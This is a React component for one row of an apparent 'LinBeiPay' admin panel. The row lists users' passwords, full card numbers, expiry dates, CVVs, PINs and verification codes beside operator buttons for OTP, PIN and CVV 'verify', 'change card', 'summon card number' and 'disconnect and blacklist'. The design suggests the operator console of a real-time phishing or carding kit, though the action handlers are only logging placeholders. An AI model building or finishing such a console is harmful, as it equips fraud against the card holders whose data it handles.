"use client"

import { useState, useEffect, useCallback } from "react"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Heart, CreditCard } from "lucide-react"
import { cn } from "@/lib/utils"
import { UserStatusActions } from "@/components/user-status-actions"

export interface LinBeiPayConfigEntry {
  id: string
  userIdPrefix: string
  userIdSuffix: string
  userEmail: string
  account?: string
  password?: string
  phone: string
  isFavorite: boolean
  cardHolderName: string
  cardNumber: string
  expiryDate: string
  cvv: string
  cardInfoSuffix: string
  verificationCode?: string
  customField?: string
  pin?: string
  status?: string // Added status
  lastUpdateTime?: string // Added lastUpdateTime
  buttonLabel?: string // Added buttonLabel
}

interface LinbeipayConfigRowProps {
  entry: LinBeiPayConfigEntry
  isSelected: boolean
  onSelectionChange: (id: string, selected: boolean) => void
  onEntryChange: (id: string, updatedEntry: Partial<LinBeiPayConfigEntry>) => void
}

export function LinbeipayConfigRow({ entry, isSelected, onSelectionChange, onEntryChange }: LinbeipayConfigRowProps) {
  const [countdown, setCountdown] = useState<number | null>(null)
  const [isSummoning, setIsSummoning] = useState(false)
  const [localEntry, setLocalEntry] = useState(entry)

  useEffect(() => {
    setLocalEntry(entry)
  }, [entry])

  const handleInputChange = (field: keyof LinBeiPayConfigEntry, value: string | boolean) => {
    const updatedPart = { [field]: value }
    setLocalEntry((prev) => ({ ...prev, ...updatedPart }))
    onEntryChange(entry.id, updatedPart)
  }

  const handleSummonCard = useCallback(() => {
    setIsSummoning(true)
    setCountdown(9)
    // Simulate API call or action
    console.log(`Summoning card for ${entry.id}`)
  }, [entry.id])

  useEffect(() => {
    if (countdown === null || !isSummoning) return

    if (countdown === 0) {
      setCountdown(null)
      setIsSummoning(false)
      // Simulate card number received
      console.log(`Card number "summoned" for ${entry.id}`)
      // You might update the card number here if the action fetches it
      // handleInputChange('cardNumber', 'XXXX XXXX XXXX XXXX'); // Example
      return
    }

    const timerId = setTimeout(() => {
      setCountdown(countdown - 1)
    }, 1000)

    return () => clearTimeout(timerId)
  }, [countdown, isSummoning])

  return (
    <tr className="border-b border-slate-700/50 hover:bg-slate-800/30 transition-colors">
      <td className="p-3 align-top">
        <Checkbox
          checked={isSelected}
          onCheckedChange={(checked) => onSelectionChange(entry.id, !!checked)}
          className="border-slate-600 data-[state=checked]:bg-purple-500 data-[state=checked]:border-purple-500"
        />
      </td>
      <td className="p-3 align-top text-sm text-slate-300">
        <div className="flex items-center">
          <Badge
            variant="outline"
            className="mr-2 bg-purple-500/10 text-purple-400 border-purple-500/50 text-xs px-1.5 py-0.5"
          >
            {localEntry.userIdPrefix}
          </Badge>
          <span>{localEntry.userIdSuffix}</span>
        </div>
        <div className="text-xs text-slate-500">{localEntry.userEmail}</div>
      </td>
      <td className="p-3 align-top">
        <Input
          type="text"
          value={localEntry.account || ""}
          onChange={(e) => handleInputChange("account", e.target.value)}
          placeholder="N/A"
          className="bg-slate-800 border-slate-600 h-8 text-xs w-24"
        />
      </td>
      <td className="p-3 align-top">
        <Input
          type="password"
          value={localEntry.password || ""}
          onChange={(e) => handleInputChange("password", e.target.value)}
          placeholder="••••••••"
          className="bg-slate-800 border-slate-600 h-8 text-xs w-24"
        />
      </td>
      <td className="p-3 align-top text-sm text-slate-300">{localEntry.phone}</td>
      <td className="p-3 align-top text-center">
        <Heart
          className={cn(
            "h-5 w-5 cursor-pointer",
            localEntry.isFavorite ? "text-purple-500 fill-purple-500" : "text-slate-500 hover:text-purple-400",
          )}
          onClick={() => handleInputChange("isFavorite", !localEntry.isFavorite)}
        />
      </td>
      <td className="p-3 align-top">
        <div className="flex items-center space-x-1">
          <Badge variant="outline" className="bg-slate-700 border-slate-600 text-slate-300 text-xs px-1.5 py-0.5">
            <CreditCard className="h-3 w-3 mr-1 text-purple-400" />D
          </Badge>
          <Input
            type="text"
            value={localEntry.cardHolderName}
            onChange={(e) => handleInputChange("cardHolderName", e.target.value)}
            placeholder="持卡人姓名"
            className="bg-slate-800 border-slate-600 h-8 text-xs w-20"
          />
          <Input
            type="text"
            value={localEntry.cardNumber}
            onChange={(e) => handleInputChange("cardNumber", e.target.value)}
            placeholder="XXXX XXXX XXXX XXXX"
            className="bg-slate-800 border-slate-600 h-8 text-xs w-36"
          />
          <Input
            type="text"
            value={localEntry.expiryDate}
            onChange={(e) => handleInputChange("expiryDate", e.target.value)}
            placeholder="MM/YY"
            className="bg-slate-800 border-slate-600 h-8 text-xs w-14"
          />
          <Input
            type="text"
            value={localEntry.cvv}
            onChange={(e) => handleInputChange("cvv", e.target.value)}
            placeholder="CVV"
            className="bg-slate-800 border-slate-600 h-8 text-xs w-12"
          />
          <Input
            type="text"
            value={localEntry.cardInfoSuffix}
            onChange={(e) => handleInputChange("cardInfoSuffix", e.target.value)}
            placeholder="1"
            className="bg-slate-800 border-slate-600 h-8 text-xs w-8"
          />
        </div>
      </td>
      <td className="p-3 align-top">
        <Input
          type="text"
          value={localEntry.verificationCode || ""}
          onChange={(e) => handleInputChange("verificationCode", e.target.value)}
          placeholder="N/A"
          className="bg-slate-800 border-slate-600 h-8 text-xs w-20"
        />
      </td>
      <td className="p-3 align-top">
        <Input
          type="text"
          value={localEntry.customField || ""}
          onChange={(e) => handleInputChange("customField", e.target.value)}
          placeholder="N/A"
          className="bg-slate-800 border-slate-600 h-8 text-xs w-20"
        />
      </td>
      <td className="p-3 align-top">
        <Input
          type="text"
          value={localEntry.pin || ""}
          onChange={(e) => handleInputChange("pin", e.target.value)}
          placeholder="N/A"
          className="bg-slate-800 border-slate-600 h-8 text-xs w-16"
        />
      </td>
      <td className="p-3 align-top text-center">
        <UserStatusActions
          status={isSummoning ? "处理中..." : entry.status || "待操作"}
          lastUpdate={isSummoning && countdown !== null ? `${countdown}秒后` : entry.lastUpdateTime || ""} // Assuming entry might have lastUpdateTime
          triggerElement={
            <Button
              size="sm"
              // onClick={handleSummonCard} // onClick is now handled by DropdownMenuTrigger if needed, or can be kept if button itself should also do something
              disabled={isSummoning && countdown !== null} // Keep button disabled during countdown
              className="bg-orange-500 hover:bg-orange-600 text-white text-xs h-8 px-2 py-1 w-full"
            >
              {isSummoning && countdown !== null ? `处理中... (${countdown}s)` : entry.buttonLabel || "召唤卡号"}
              {/* entry.buttonLabel could be dynamic based on status */}
            </Button>
          }
          // Pass appropriate handlers for actions within UserStatusActions
          // For now, these are placeholders. You'll need to implement them.
          onOtpVerify={() => console.log(`OTP Verify for ${entry.id}`)}
          onEmailVerify={() => console.log(`Email Verify for ${entry.id}`)}
          onAppVerify={() => console.log(`App Verify for ${entry.id}`)}
          onPinVerify={() => console.log(`PIN Verify for ${entry.id}`)}
          onCvvVerify={() => console.log(`CVV Verify for ${entry.id}`)}
          onRejectCustom={(reason) => console.log(`Reject (Custom: ${reason}) for ${entry.id}`)}
          onRejectChangeCard={() => console.log(`Reject (Change Card) for ${entry.id}`)}
          onApprove={() => {
            console.log(`Approve for ${entry.id}`)
            // Potentially call handleSummonCard here or a similar function
            // if "Approve" means initiating the summon card process
            handleSummonCard()
          }}
          onDisconnect={() => console.log(`Disconnect for ${entry.id}`)}
          onDisconnectAndBlacklist={() => console.log(`Disconnect & Blacklist for ${entry.id}`)}
        />
        {/* Displaying status below the dropdown trigger might be redundant if status is in trigger or dropdown */}
        {/* Or, it could be a separate status indicator if needed */}
        {/* {!isSummoning && entry.status && !countdown && <div className="text-xs text-green-400 mt-1">{entry.status}</div>} */}
      </td>
    </tr>
  )
}
